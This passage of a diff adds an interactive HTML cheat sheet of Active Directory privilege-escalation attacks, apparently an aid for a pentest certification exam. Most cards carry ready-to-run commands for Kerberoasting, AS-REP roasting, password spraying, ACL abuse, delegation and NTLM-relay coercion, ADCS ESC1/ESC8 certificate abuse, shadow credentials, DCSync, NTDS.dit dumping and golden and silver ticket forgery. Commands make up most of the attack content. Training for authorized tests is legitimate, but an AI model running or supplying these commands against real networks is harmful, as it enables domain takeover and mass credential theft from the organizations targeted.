+        <text class="node-sub" x="672" y="172">printerbug → TGT capture</text></a>
+
+      <a href="#card-constrained"><rect class="node-rect abuse" x="565" y="195" width="215" height="44"/>
+        <text class="node-text" x="672" y="218">Constrained Deleg.</text>
+        <text class="node-sub" x="672" y="232">getST.py S4U → impersonate</text></a>
+
+      <a href="#card-rbcd"><rect class="node-rect abuse" x="565" y="255" width="215" height="44"/>
+        <text class="node-text" x="672" y="278">RBCD</text>
+        <text class="node-sub" x="672" y="292">add msDS-AllowedToAct</text></a>
+
+      <a href="#card-relay-ldap"><rect class="node-rect abuse" x="565" y="315" width="215" height="44"/>
+        <text class="node-text" x="672" y="338">NTLM Relay → LDAPS</text>
+        <text class="node-sub" x="672" y="352">RBCD via relay</text></a>
+
+      <rect class="group-bg" x="815" y="100" width="245" height="500"/>
+      <text class="group-label" x="835" y="120">ADCS / END-GAME</text>
+
+      <a href="#card-esc1"><rect class="node-rect abuse" x="830" y="135" width="215" height="44"/>
+        <text class="node-text" x="937" y="158">ADCS ESC1</text>
+        <text class="node-sub" x="937" y="172">request cert as DA</text></a>
+
+      <a href="#card-esc8"><rect class="node-rect abuse" x="830" y="195" width="215" height="44"/>
+        <text class="node-text" x="937" y="218">ADCS ESC8</text>
+        <text class="node-sub" x="937" y="232">relay → web enroll</text></a>
+
+      <a href="#card-shadow-cred"><rect class="node-rect abuse" x="830" y="255" width="215" height="44"/>
+        <text class="node-text" x="937" y="278">Shadow Credentials</text>
+        <text class="node-sub" x="937" y="292">WHfBKey → PKINIT</text></a>
+
+      <a href="#card-dcsync"><rect class="node-rect win" x="830" y="315" width="215" height="44"/>
+        <text class="node-text" x="937" y="338">DCSync</text>
+        <text class="node-sub" x="937" y="352">secretsdump → krbtgt</text></a>
+
+      <a href="#card-ntds"><rect class="node-rect win" x="830" y="375" width="215" height="44"/>
+        <text class="node-text" x="937" y="398">NTDS.dit dump</text>
+        <text class="node-sub" x="937" y="412">all NT hashes from DC</text></a>
+
+      <a href="#card-golden"><rect class="node-rect win" x="830" y="435" width="215" height="44"/>
+        <text class="node-text" x="937" y="458">Golden Ticket</text>
+        <text class="node-sub" x="937" y="472">krbtgt hash → any TGT</text></a>
+
+      <text class="label" x="550" y="610" style="font-size:10px; fill:#5fd49b">⚑ owned everything? cleanup → local.txt + proof.txt</text>
+    </svg>
+  </div>
+</section>
+
+<!-- CARDS -->
+<section id="cards" class="cards-section">
+  <div class="flow-head" style="margin-bottom:0">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ ALL ]</span>
+      <span class="flow-title">TRIGGER CARDS · SEARCHABLE</span>
+    </div>
+    <div class="flow-trigger"><strong>⌘K</strong> to search · click diagram to jump</div>
+  </div>
+
+  <div class="filters">
+    <span class="filter-label">FILTER:</span>
+    <button class="pill active" data-filter="all">ALL <span class="pill-count" id="count-all">0</span></button>
+    <button class="pill" data-filter="abuse">ABUSE <span class="pill-count" id="count-abuse">0</span></button>
+    <button class="pill" data-filter="access">LATERAL <span class="pill-count" id="count-access">0</span></button>
+    <button class="pill" data-filter="win">END-GAME <span class="pill-count" id="count-win">0</span></button>
+    <button class="pill" data-filter="state-user">USER OK <span class="pill-count" id="count-state-user">0</span></button>
+    <button class="pill" data-filter="state-admin">NEEDS ADMIN <span class="pill-count" id="count-state-admin">0</span></button>
+  </div>
+  <div id="results"></div>
+</section>
+
+<!-- ANTI-PATTERNS -->
+<section id="anti" class="cards-section">
+  <div class="flow-head" style="margin-bottom:0">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ ⚠ ]</span>
+      <span class="flow-title" style="color:var(--warn)">ANTI-PATTERNS</span>
+    </div>
+  </div>
+  <div class="anti-list">
+    <div class="anti"><div class="anti-bad">Grind on Kerberoasting when no SPN accounts exist</div><div class="anti-fix">Check first with <code>GetUserSPNs</code> (no --request). Empty list = move on. AS-REP roast as fallback.</div></div>
+    <div class="anti"><div class="anti-bad">Try DCSync without checking BH first</div><div class="anti-fix"><code>Get-ObjectAcl</code> path of DS-Replication-Get-Changes-All must be on YOUR account or a group you can join. BH "Outbound Object Control" view.</div></div>
+    <div class="anti"><div class="anti-bad">Run targetedKerberoast without verifying GenericWrite</div><div class="anti-fix">Setting an SPN requires GenericWrite or GenericAll on the user object. Confirm in BH first, otherwise you waste time on perm-denied.</div></div>
+    <div class="anti"><div class="anti-bad">Crack kerberoast hash with default rockyou rules</div><div class="anti-fix">Service accounts have long pwds. Use <code>rockyou.txt + best64.rule</code> minimum. Or kerberoast → 90% need OneRuleToRuleThemAll.</div></div>
+    <div class="anti"><div class="anti-bad">Skip ADCS because it sounds advanced</div><div class="anti-fix">ESC1 is "request a cert as anyone" in one command. <code>certipy find</code> → <code>certipy req</code>. Often faster than ACL chains.</div></div>
+    <div class="anti"><div class="anti-bad">Forget to time-sync before Kerberos attacks</div><div class="anti-fix">KRB_AP_ERR_SKEW means your Kali clock is &gt;5min off the DC. <code>sudo rdate -n &lt;DC&gt;</code> or <code>sudo ntpdate &lt;DC&gt;</code>.</div></div>
+    <div class="anti"><div class="anti-bad">Leave injected SPN / added group member after attack</div><div class="anti-fix">Graders penalize lingering changes. <code>setspn -D</code>, <code>net group remove</code>, delete certs you requested. Cleanup field on each card.</div></div>
+    <div class="anti"><div class="anti-bad">Try RBCD without a computer account you control</div><div class="anti-fix">RBCD needs an SPN on the principal you're using. Default users can <code>add computer</code> via MachineAccountQuota=10 — use that.</div></div>
+    <div class="anti"><div class="anti-bad">Run BloodHound once, never re-ingest</div><div class="anti-fix">Every new cred opens new paths. Re-collect (or just mark-owned + re-query) after EVERY pop. The graph changes.</div></div>
+    <div class="anti"><div class="anti-bad">Crack Kerberos hashes for hours mid-exam</div><div class="anti-fix">15min cap. Move on to a different attack while hashcat runs in the background — don't stare at it.</div></div>
+  </div>
+</section>
+
+<div class="foot-info">
+  <div>KEY → <code>⌘/Ctrl+K</code> search · <code>ESC</code> clear · hover commands to copy · click diagram nodes to jump</div>
+  <div style="margin-top:8px">phases: <span style="color:var(--abuse)">ABUSE</span> · <span style="color:var(--access)">LATERAL</span> · <span style="color:var(--win)">END-GAME</span></div>
+  <div style="margin-top:8px; opacity:0.6">v1 · ad privesc focus · companion to enum + pivot banks</div>
+</div>
+
+</main>
+
+<script>
+const patterns = [
+  // ===== BLOODHOUND ORIENTATION =====
+  {
+    id: 'bh-mark',
+    phase: 'abuse', state: 'user', tags: [],
+    title: 'BloodHound: mark owned + shortest path to DA',
+    triggers: ['bloodhound', 'mark owned', 'shortest path', 'cypher', 'analysis'],
+    action: 'After every new credential, right-click the user → Mark User as Owned, then Analysis → Shortest Paths from Owned Principals. The graph tells you which of the cards below applies in this domain.',
+    cmd: `# In BH GUI:
+# 1. Search user → right-click → Mark User as Owned
+# 2. Analysis tab → "Shortest Paths from Owned Principals"
+# 3. Also: "Find Workstations where Domain Users can RDP"
+# 4. Also: "Find Computers with Unconstrained Delegation"
+
+# Custom Cypher for "show me ALL paths from anyone owned":
+MATCH p=shortestPath((u {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p
+
+# Update graph after new cred without recollecting:
+MATCH (u:User {name:'<NEW_USER>@CORP.LOCAL'}) SET u.owned=true`,
+    cleanup: '',
+    related: ['kerberoast', 'genericall-user']
+  },
+
+  // ===== KERBEROS PRE-AUTH =====
+  {
+    id: 'asrep',
+    phase: 'abuse', state: 'admin', tags: [],
+    title: 'AS-REP Roasting',
+    triggers: ['asrep', 'as-rep', 'asreproast', 'getnpusers', 'no pre-auth', 'preauth disabled', 'krb5asrep'],
+    action: 'Free hash for any user with "Do not require Kerberos preauthentication" set. Pre-auth attack — username only, no creds. Hashcat mode 18200.',
+    cmd: `# List of users (no creds)
+GetNPUsers.py corp.local/ -no-pass -usersfile users.txt \\
+  -dc-ip <DC-IP> -format hashcat -outputfile asrep.hashes
+
+# With creds (target all roastable)
+GetNPUsers.py corp.local/<user>:'<pwd>' -dc-ip <DC-IP> \\
+  -request -format hashcat -outputfile asrep.hashes
+
+# Crack
+hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt \\
+  -r /usr/share/hashcat/rules/best64.rule --force`,
+    cleanup: '',
+    related: ['kerberoast', 'spray']
+  },
+  {
+    id: 'kerberoast',
+    phase: 'abuse', state: 'user', tags: [],
+    title: 'Kerberoasting (TGS hash → crack)',
+    triggers: ['kerberoast', 'getuserspns', 'spn', 'tgs', 'service account', '13100'],
+    action: 'Every user with an SPN gives you a TGS encrypted with their NT hash. Crack offline. Hashcat 13100. Service accounts have weak/old pwds → high success rate.',
+    cmd: `# Request TGS for all SPN accounts at once
+GetUserSPNs.py -dc-ip <DC-IP> corp.local/<user>:'<pwd>' \\
+  -request -outputfile kerb.hashes
+
+# PtH variant
+GetUserSPNs.py -dc-ip <DC-IP> -hashes :<NT> corp.local/<user> \\
+  -request -outputfile kerb.hashes
+
+# Crack
+hashcat -m 13100 kerb.hashes /usr/share/wordlists/rockyou.txt \\
+  -r /usr/share/hashcat/rules/best64.rule --force
+
+# If best64 misses, try OneRuleToRuleThemAll
+hashcat -m 13100 kerb.hashes rockyou.txt -r OneRuleToRuleThemAll.rule`,
+    cleanup: '',
+    related: ['asrep', 'bh-mark']
+  },
+  {
+    id: 'spray',
+    phase: 'abuse', state: 'admin', tags: [],
+    title: 'Password spray (lockout-aware)',
+    triggers: ['spray', 'password spray', 'kerbrute spray', 'cme spray', 'season password'],
+    action: 'One password against many users. ALWAYS check lockout first. Use kerbrute or cme — they handle the rotation. Seasonal pwds + company name + Welcome2024 = ~30% hit rate.',
+    cmd: `# Lockout policy FIRST
+crackmapexec smb <DC> -u '' -p '' --pass-pol
+
+# Common spray candidates
+echo -e "Password1\\nWelcome2024\\nSummer2024!\\nCompany2024\\nPassword123!" > spray.txt
+
+# Kerbrute (cleanest, fast)
+kerbrute passwordspray -d corp.local --dc <DC-IP> users.txt 'Welcome2024'
+
+# CME — rotate, don't blast
+for p in $(cat spray.txt); do
+  crackmapexec smb <DC> -u users.txt -p "$p" --continue-on-success | grep '\\[+\\]'
+  sleep 1800  # 30 min between rounds for lockout reset
+done`,
+    cleanup: '',
+    related: ['asrep', 'kerberoast']
+  },
+
+  // ===== ACL ABUSE =====
+  {
+    id: 'genericall-user',
+    phase: 'abuse', state: 'user', tags: [],
+    title: 'GenericAll on a user → targeted Kerberoast or shadow cred',
+    triggers: ['genericall', 'generic all', 'full control user', 'targeted kerberoast'],
+    action: 'Full control over a user object. Two clean attacks: (1) set an SPN → kerberoast → crack. (2) Shadow credentials via msDS-KeyCredentialLink → PKINIT.',
+    cmd: `# OPTION A: targeted Kerberoast
+# Set an SPN on the victim
+targetedKerberoast.py -v -d corp.local -u <user> -p '<pwd>'
+# Or manual:
+addspn.py -u <user> -p '<pwd>' -s 'kerberoast/spn' --target <victim> <DC>
+GetUserSPNs.py corp.local/<user>:'<pwd>' -request
+
+# OPTION B: shadow credentials (preferred if PKINIT works)
+certipy shadow auto -username <user>@corp.local \\
+  -password '<pwd>' -account <victim>
+# → prints NT hash + ccache
+
+# OPTION C: force pwd change
+net rpc password '<victim>' 'NewPwd!' -U <user>%<pwd> -S <DC>`,
+    cleanup: 'remove SPN: addspn.py --remove · revert pwd if changed · certipy shadow auto --restore',
+    related: ['genericall-group', 'shadow-cred', 'force-pwd']
+  },
+  {
+    id: 'genericall-group',
+    phase: 'abuse', state: 'user', tags: [],
+    title: 'GenericAll on a group → add yourself',
+    triggers: ['genericall group', 'add member', 'group control', 'net group add'],
+    action: 'Full control over a group means you can add anyone. If that group is or grants Domain Admins, you\'re done.',
+    cmd: `# Add yourself via impacket
+net rpc group addmem 'TargetGroup' '<user>' -U <user>%<pwd> -S <DC>
+
+# Or via bloodyAD
+bloodyAD --host <DC-IP> -d corp.local -u <user> -p '<pwd>' \\
+  add groupMember TargetGroup <user>
+
+# Verify
+crackmapexec ldap <DC> -u <user> -p '<pwd>' -M groupmembership
+
+# If group → DA chain works, drop new shell with new privileges`,
+    cleanup: `net rpc group delmem 'TargetGroup' '<user>' -U <user>%<pwd> -S <DC>`,
+    related: ['genericall-user', 'writedacl']
+  },
+  {
+    id: 'writedacl',
+    phase: 'abuse', state: 'user', tags: [],
+    title: 'WriteDACL → grant DCSync rights',
+    triggers: ['writedacl', 'dcsync rights', 'replication', 'ds-replication-get-changes'],
+    action: 'WriteDACL on Domain object lets you grant yourself the two replication rights needed for DCSync. Two commands → krbtgt hash.',
+    cmd: `# Grant yourself DS-Replication-Get-Changes rights
+dacledit.py -action 'write' -rights 'DCSync' \\
+  -principal <user> -target-dn 'DC=corp,DC=local' \\
+  'corp.local/<user>:<pwd>'
+
+# Or PowerView (from Win shell)
+Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' \\
+  -PrincipalIdentity '<user>' -Rights DCSync
+
+# Then DCSync
+secretsdump.py -just-dc-user krbtgt corp.local/<user>:'<pwd>'@<DC>`,
+    cleanup: `dacledit.py -action 'remove' -rights 'DCSync' -principal <user> -target-dn 'DC=corp,DC=local' 'corp.local/<user>:<pwd>'`,
+    related: ['dcsync', 'force-pwd']
+  },
+  {
+    id: 'force-pwd',
+    phase: 'abuse', state: 'user', tags: [],
+    title: 'ForceChangePassword (User-Force-Change-Password)',
+    triggers: ['forcechangepassword', 'reset password', 'change password', 'user-force-change'],
+    action: 'One specific ACL allows password reset without knowing the old one. Sometimes more elegant than GenericAll.',
+    cmd: `# Reset victim password
+net rpc password '<victim>' 'NewPwd2024!' -U <user>%<pwd> -S <DC>
+
+# Or impacket
+changepasswd.py -newpass 'NewPwd2024!' \\
+  corp.local/<user>:'<pwd>'@<DC> -altuser '<victim>'
+
+# Or rpcclient
+rpcclient -U <user>%<pwd> <DC> -c "setuserinfo2 <victim> 23 NewPwd2024!"
+
+# Now use new creds
+crackmapexec smb <DC> -u <victim> -p 'NewPwd2024!'`,
+    cleanup: 'reset original password if known, or warn admin in report',
+    related: ['genericall-user']
+  },
+  {
+    id: 'gmsa',
+    phase: 'abuse', state: 'user', tags: [],
+    title: 'ReadGMSAPassword (msDS-ManagedPassword)',
+    triggers: ['gmsa', 'group managed service account', 'msds-managedpassword', 'gmsadumper'],
+    action: 'If you can read msDS-ManagedPassword, you get the gMSA NT hash. gMSAs often run services with extra privileges.',
+    cmd: `# Identify gMSAs first
+crackmapexec ldap <DC> -u <user> -p '<pwd>' --gmsa
+
+# Dump password blob
+python3 gMSADumper.py -u <user> -p '<pwd>' -d corp.local
+
+# Output gives you NT hash → PtH
+evil-winrm -i <target> -u 'gmsa-svc$' -H <NT>
+crackmapexec smb <DC> -u 'gmsa-svc$' -H <NT>`,
+    cleanup: '',
+    related: ['laps', 'bh-mark']
+  },
+  {
+    id: 'laps',
+    phase: 'abuse', state: 'user', tags: [],
+    title: 'ReadLAPSPassword (ms-Mcs-AdmPwd)',
+    triggers: ['laps', 'ms-mcs-admpwd', 'local admin pwd', 'lapsdumper'],
+    action: 'LAPS stores cleartext local admin pwds in AD. If you can read ms-Mcs-AdmPwd, you have local admin on that machine.',
+    cmd: `# Dump all readable LAPS pwds
+crackmapexec ldap <DC> -u <user> -p '<pwd>' -M laps
+# or:
+nxc ldap <DC> -u <user> -p '<pwd>' --laps
+
+# Direct query
+ldapsearch -x -H ldap://<DC> -b 'DC=corp,DC=local' \\
+  -D '<user>@corp.local' -w '<pwd>' \\
+  '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd cn
+
+# Use the cleartext admin pwd
+evil-winrm -i <host> -u administrator -p '<LAPS_PWD>'`,
+    cleanup: '',
+    related: ['gmsa']
+  },
+
+  // ===== DELEGATION =====
+  {
+    id: 'unconstrained',
+    phase: 'abuse', state: 'admin', tags: [],
+    title: 'Unconstrained Delegation + PrinterBug',
+    triggers: ['unconstrained', 'unconstrained delegation', 'printerbug', 'spoolss', 'TrustedForDelegation'],
+    action: 'A computer with TrustedForDelegation caches TGTs of anyone authenticating to it. Force DC$ to auth via printerbug → capture DC$ TGT → DCSync.',
+    cmd: `# 1. Find unconstrained-delegation computers (BH or LDAP)
+crackmapexec ldap <DC> -u <user> -p '<pwd>' --trusted-for-delegation
+
+# 2. On the unconstrained host (you need admin there)
+# Start rubeus or capture loop
+rubeus.exe monitor /interval:5 /nowrap
+
+# 3. From Kali, trigger spoolss
+printerbug.py corp.local/<user>:'<pwd>'@<DC-IP> <UNCON-HOST-FQDN>
+
+# 4. DC$ TGT lands in rubeus output → use ticket
+rubeus.exe ptt /ticket:<base64>
+# now act as DC$:
+secretsdump.py -k -no-pass corp.local/dc01\\$@<DC>`,
+    cleanup: 'rubeus purge tickets · delete dumped files',
+    related: ['constrained', 'dcsync']
+  },
+  {
+    id: 'constrained',
+    phase: 'abuse', state: 'user', tags: [],
+    title: 'Constrained Delegation (S4U2self / S4U2proxy)',
+    triggers: ['constrained delegation', 's4u', 's4u2self', 's4u2proxy', 'getst.py', 'allowedtodelegateto'],
+    action: 'Account allowed to delegate to specific services. Use S4U to impersonate any user (including DA) against that service.',
+    cmd: `# 1. Find via BH or LDAP
+crackmapexec ldap <DC> -u <user> -p '<pwd>' --get-userpasses-for-deleg
+
+# 2. If <delegate-user> has constrained deleg to cifs/<target>:
+# Get TGT for delegate user (need their pwd or hash)
+getTGT.py corp.local/<delegate-user>:'<pwd>'
+
+# 3. S4U for an admin against the delegated service
+export KRB5CCNAME=delegate-user.ccache
+getST.py -spn cifs/<target>.corp.local \\
+  -impersonate Administrator \\
+  corp.local/<delegate-user>:'<pwd>'
+
+# 4. Use the ticket
+export KRB5CCNAME=Administrator.ccache
+psexec.py -k -no-pass <target>.corp.local`,
+    cleanup: 'rm *.ccache after use',
+    related: ['rbcd', 'unconstrained']
+  },
+  {
+    id: 'rbcd',
+    phase: 'abuse', state: 'user', tags: [],
+    title: 'Resource-Based Constrained Delegation (RBCD)',
+    triggers: ['rbcd', 'resource-based', 'msds-allowedtoactonbehalfofotheridentity', 'allowedtoact'],
+    action: 'If you can write msDS-AllowedToActOnBehalfOfOtherIdentity on a victim computer, you control delegation to it. Add a computer you own → S4U as anyone.',
+    cmd: `# 1. Need a computer account you control
+#    Default MachineAccountQuota=10 lets you add one
+addcomputer.py -computer-name 'evilpc$' \\
+  -computer-pass 'Evil123!' \\
+  corp.local/<user>:'<pwd>'
+
+# 2. Write RBCD attribute
+rbcd.py -delegate-from 'evilpc$' \\
+  -delegate-to '<VICTIM-COMPUTER>$' \\
+  -action write corp.local/<user>:'<pwd>'
+
+# 3. S4U2self+S4U2proxy as administrator
+getST.py -spn cifs/<victim>.corp.local \\
+  -impersonate Administrator \\
+  corp.local/'evilpc$':'Evil123!'
+
+# 4. Use
+export KRB5CCNAME=Administrator@cifs_<victim>.corp.local@CORP.LOCAL.ccache
+psexec.py -k -no-pass <victim>.corp.local`,
+    cleanup: `rbcd.py ... -action flush · remove computer: removeComputer evilpc\\$`,
+    related: ['constrained', 'relay-ldap']
+  },
+  {
+    id: 'relay-ldap',
+    phase: 'abuse', state: 'admin', tags: [],
+    title: 'NTLM relay → LDAPS (RBCD)',
+    triggers: ['ntlm relay', 'ntlmrelayx', 'ldaps relay', 'petitpotam', 'webdav coerce'],
+    action: 'Coerce a machine account to auth to you → relay to LDAPS → set RBCD on it. Result: control delegation to that target.',
+    cmd: `# Terminal 1: ntlmrelayx (LDAPS, RBCD mode)
+ntlmrelayx.py -t ldaps://<DC> --delegate-access \\
+  --escalate-user '<user>' --no-smb-server
+
+# Terminal 2: coerce auth from <VICTIM>
+# Option A: PetitPotam (unauth)
+petitpotam.py -u <user> -p '<pwd>' -d corp.local \\
+  <KALI-IP> <VICTIM-IP>
+
+# Option B: printerbug
+printerbug.py corp.local/<user>:'<pwd>'@<VICTIM> <KALI-IP>
+
+# ntlmrelayx output gives you a computer account
+# Now S4U → impersonate anyone against <VICTIM>
+getST.py -spn cifs/<victim> -impersonate Administrator \\
+  corp.local/<created-computer>\\$:'<random-pass>'`,
+    cleanup: 'remove RBCD attribute after attack',
+    related: ['rbcd', 'unconstrained']
+  },
+
+  // ===== ADCS =====
+  {
+    id: 'esc1',
+    phase: 'abuse', state: 'user', tags: [],
+    title: 'ADCS ESC1 — vuln template + SAN',
+    triggers: ['esc1', 'adcs esc1', 'cert template', 'subject alternative name', 'enrollee supplies subject', 'certipy req'],
+    action: 'A cert template that lets low-priv users enroll AND specify the Subject Alternative Name = "request a cert as anyone". One command for DA.',
+    cmd: `# 1. Find vulnerable templates
+certipy find -u <user>@corp.local -p '<pwd>' \\
+  -dc-ip <DC-IP> -vulnerable -stdout
+# Look for: ESC1 in Vulnerabilities
+
+# 2. Request cert as Administrator
+certipy req -u <user>@corp.local -p '<pwd>' \\
+  -ca '<CA-NAME>' -template '<VULN-TEMPLATE>' \\
+  -upn administrator@corp.local
+
+# 3. Authenticate with cert → NT hash
+certipy auth -pfx administrator.pfx \\
+  -dc-ip <DC-IP> -username administrator -domain corp.local
+
+# → outputs Administrator NT hash`,
+    cleanup: 'rm *.pfx · rm *.ccache',
+    related: ['esc8', 'shadow-cred']
+  },
+  {
+    id: 'esc8',
+    phase: 'abuse', state: 'admin', tags: [],
+    title: 'ADCS ESC8 — NTLM relay to web enrollment',
+    triggers: ['esc8', 'adcs esc8', 'web enrollment', 'certsrv', 'ntlmrelayx adcs', 'http relay'],
+    action: 'CA with HTTP/HTTPS web enrollment + NTLM = relay any computer account auth → get a cert for it. Most impactful when relayed account is DC$.',
+    cmd: `# Terminal 1: relay to web enrollment
+ntlmrelayx.py --target 'http://<CA-IP>/certsrv/certfnsh.asp' \\
+  --adcs --template DomainController
+
+# Terminal 2: coerce DC$ auth
+petitpotam.py -u <user> -p '<pwd>' -d corp.local \\
+  <KALI-IP> <DC-IP>
+# or printerbug if PetitPotam patched
+
+# Output: base64-encoded cert
+# Save → use to auth as DC$
+echo '<b64>' | base64 -d > dc.pfx
+certipy auth -pfx dc.pfx -dc-ip <DC-IP>
+
+# Now you have DC$ TGT → DCSync
+secretsdump.py -k -no-pass corp.local/dc01\\$@<DC>`,
+    cleanup: '',
+    related: ['esc1', 'relay-ldap']
+  },
+  {
+    id: 'shadow-cred',
+    phase: 'abuse', state: 'user', tags: [],
+    title: 'Shadow Credentials (WHfBKey / msDS-KeyCredentialLink)',
+    triggers: ['shadow credentials', 'whfbkey', 'msds-keycredentiallink', 'pkinit', 'certipy shadow'],
+    action: 'GenericAll/GenericWrite on a user/computer? Add a key credential → PKINIT auth → grab NT hash. No password reset needed, less disruptive than targetedKerberoast.',
+    cmd: `# Need GenericWrite/GenericAll on victim
+certipy shadow auto \\
+  -username <user>@corp.local -password '<pwd>' \\
+  -account <victim> -dc-ip <DC-IP>
+
+# → outputs:
+#   * NT hash for <victim>
+#   * .ccache file for PKINIT auth
+#   * automatic cleanup of added key
+
+# If auto doesn't work, manual:
+certipy shadow add -username <user>@corp.local -password '<pwd>' \\
+  -account <victim>
+# Then certipy auth → certipy shadow remove`,
+    cleanup: 'certipy shadow auto handles cleanup. Otherwise: certipy shadow remove -account <victim>',
+    related: ['genericall-user', 'esc1']
+  },
+
+  // ===== END-GAME =====
+  {
+    id: 'dcsync',
+    phase: 'win', state: 'user', tags: [],
+    title: 'DCSync — pull NT hashes from DC',
+    triggers: ['dcsync', 'secretsdump', 'replication', 'just-dc', 'krbtgt'],
+    action: 'Requires DS-Replication-Get-Changes + DS-Replication-Get-Changes-All on Domain object. Default for: DA, Enterprise Admins, Account Operators, anyone you grant via WriteDACL.',
+    cmd: `# Just krbtgt (for golden tickets)
+secretsdump.py -just-dc-user krbtgt corp.local/<user>:'<pwd>'@<DC>
+
+# Just administrator
+secretsdump.py -just-dc-user administrator corp.local/<user>:'<pwd>'@<DC>
+
+# All users (full domain dump)
+secretsdump.py -just-dc corp.local/<user>:'<pwd>'@<DC>
+
+# PtH variant
+secretsdump.py -just-dc -hashes :<NT> corp.local/<user>@<DC>
+
+# Output gives Administrator NT hash → PtH into DC
+evil-winrm -i <DC> -u administrator -H <admin-NT>`,
+    cleanup: '',
+    related: ['ntds', 'golden']
+  },
+  {
+    id: 'ntds',
+    phase: 'win', state: 'admin', tags: [],
+    title: 'NTDS.dit + SYSTEM dump (need DC shell)',
+    triggers: ['ntds.dit', 'ntds', 'ntdsutil', 'system hive dc', 'all hashes', 'dump database'],
+    action: 'Same hashes as DCSync but pulled differently — when you have SHELL on the DC. ntdsutil snapshot OR direct file copy via VSS.',
+    cmd: `# From shell on DC (admin):
+ntdsutil "ac in ntds" "ifm" "create full C:\\temp\\dump" q q
+
+# Files created:
+# C:\\temp\\dump\\Active Directory\\ntds.dit
+# C:\\temp\\dump\\registry\\SYSTEM
+
+# Exfil both to Kali, then:
+secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+
+# Alternative — VSS direct
+vssadmin create shadow /for=C:
+copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\temp\\
+reg save HKLM\\SYSTEM C:\\temp\\SYSTEM`,
+    cleanup: 'rmdir /s /q C:\\temp\\dump · vssadmin delete shadows /shadow=<id>',
+    related: ['dcsync', 'golden']
+  },
+  {
+    id: 'golden',
+    phase: 'win', state: 'user', tags: [],
+    title: 'Golden Ticket (krbtgt forgery)',
+    triggers: ['golden', 'golden ticket', 'krbtgt', 'ticketer', 'forged tgt'],
+    action: 'With krbtgt NT hash, forge TGTs for anyone, including non-existent users. Persistence + access. Note: exam rarely needs this — DCSync alone wins.',
+    cmd: `# Need: krbtgt NT hash + domain SID
+# Get domain SID first
+lookupsid.py corp.local/<user>:'<pwd>'@<DC> | head -1
+# Example: S-1-5-21-1111111111-2222222222-3333333333
+
+# Forge ticket
+ticketer.py -nthash <KRBTGT_NT> \\
+  -domain-sid S-1-5-21-... \\
+  -domain corp.local administrator
+
+# Use
+export KRB5CCNAME=administrator.ccache
+psexec.py -k -no-pass corp.local/administrator@<DC>`,
+    cleanup: 'rm *.ccache',
+    related: ['dcsync', 'silver']
+  },
+  {
+    id: 'silver',
+    phase: 'win', state: 'user', tags: [],
+    title: 'Silver Ticket (service hash forgery)',
+    triggers: ['silver', 'silver ticket', 'service ticket', 'forged tgs'],
+    action: 'Cracked a service account NT hash but it doesn\'t have a useful direct role? Forge service tickets as anyone for that service. Limited to that one service, but stealthier than golden.',
+    cmd: `# Need: target service account NT hash + domain SID
+
+ticketer.py -nthash <SVC_NT> \\
+  -domain-sid S-1-5-21-... \\
+  -domain corp.local \\
+  -spn cifs/<target>.corp.local \\
+  administrator
+
+export KRB5CCNAME=administrator.ccache
+smbclient.py -k -no-pass corp.local/administrator@<target>`,
+    cleanup: 'rm *.ccache',
+    related: ['golden', 'kerberoast']
+  },
+];
+
+const phaseOrder = ['setup', 'access', 'enum', 'abuse', 'win'];
+const phaseLabels = { setup: 'SETUP', access: 'LATERAL', enum: 'ENUM', abuse: 'ABUSE', win: 'END-GAME' };
+
+const $ = (sel) => document.querySelector(sel);
+const searchEl = $('#search'); const resultsEl = $('#results');
+const filterBtns = document.querySelectorAll('.pill');
+let activeFilter = 'all'; let query = '';
+
+function escapeHtml(s) { return String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])); }
+function highlight(text, q) {
+  if (!q) return escapeHtml(text);
+  const escaped = escapeHtml(text);
+  const terms = q.split(/\s+/).filter(t => t.length > 0).map(t => t.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'));
+  if (!terms.length) return escaped;
+  const re = new RegExp(`(${terms.join('|')})`, 'gi');
+  return escaped.replace(re, '<mark>$1</mark>');
+}
+function matchesQuery(p, q) {
+  if (!q) return true;
+  const hay = [p.title, p.action, p.cmd, p.triggers.join(' '), (p.tags||[]).join(' '), p.id].join(' ').toLowerCase();
+  const terms = q.toLowerCase().split(/\s+/).filter(t => t.length > 0);
+  return terms.every(t => hay.includes(t));
+}
+function matchesFilter(p, f) {
+  if (f === 'all') return true;
+  if (f === 'state-user') return p.state === 'user' || p.state === 'both';
+  if (f === 'state-admin') return p.state === 'admin' || p.state === 'both';
+  return p.phase === f;
+}
+function renderCard(p, q) {
+  const tH = p.triggers.map(t => {
+    const m = q && q.toLowerCase().split(/\s+/).some(qt => qt.length > 0 && t.toLowerCase().includes(qt));
+    return `<span class="trigger ${m ? 'match' : ''}">${escapeHtml(t)}</span>`;
+  }).join('');
+  const cH = p.cmd ? `<div class="cmd-wrap"><pre class="cmd">${highlight(p.cmd, q)}</pre><button class="cmd-copy" data-cmd="${encodeURIComponent(p.cmd)}">COPY</button></div>` : '';
+  const clH = p.cleanup ? `<div class="cleanup"><span class="cleanup-label">CLEANUP</span>${escapeHtml(p.cleanup)}</div>` : '';
+  const sL = { user: '<span class="state-tag user">USER OK</span>', admin: '<span class="state-tag admin">NEEDS ADMIN</span>', both: '<span class="state-tag both">EITHER</span>' }[p.state] || '';
+  return `<article class="card" data-phase="${p.phase}" data-state="${p.state}" id="card-${p.id}">
+    <div class="card-head"><div class="card-title">${highlight(p.title, q)}</div><span class="card-cat">${phaseLabels[p.phase]}</span></div>
+    <div class="triggers">${tH}</div>
+    <div class="arrow-line"><span class="arrow">→</span><span class="action">${highlight(p.action, q)}</span></div>
+    ${cH}${clH}<div class="card-foot">${sL}</div></article>`;
+}
+function render() {
+  const f = patterns.filter(p => matchesFilter(p, activeFilter) && matchesQuery(p, query));
+  $('#resultCount').textContent = f.length;
